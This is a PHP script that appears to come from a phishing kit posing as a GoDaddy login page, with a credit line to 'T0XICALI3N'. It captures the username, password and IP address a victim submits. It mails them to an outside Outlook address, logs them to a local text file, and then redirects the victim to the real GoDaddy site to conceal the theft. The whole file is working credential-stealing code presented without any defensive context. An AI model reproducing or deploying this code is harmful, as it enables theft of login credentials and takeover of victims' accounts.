<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------New Login--------\n";
$message .= "USER : ".$_POST['username']."\n";
$message .= "PASSWORD : ".$_POST['password']."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "---------------Created BY T0XICALI3N-----------\n";
$send = "pesanboss@outlook.com";
$subject = "Godaddy Login";


mail($send,$subject,$message,$headers);

$pula = fopen ("gods2020.txt" , "a");
fwrite ($pula , $message);
fclose ($pula);

$redirect = "https://www.godaddy.com/";

header("Location: " . $redirect);
 
?>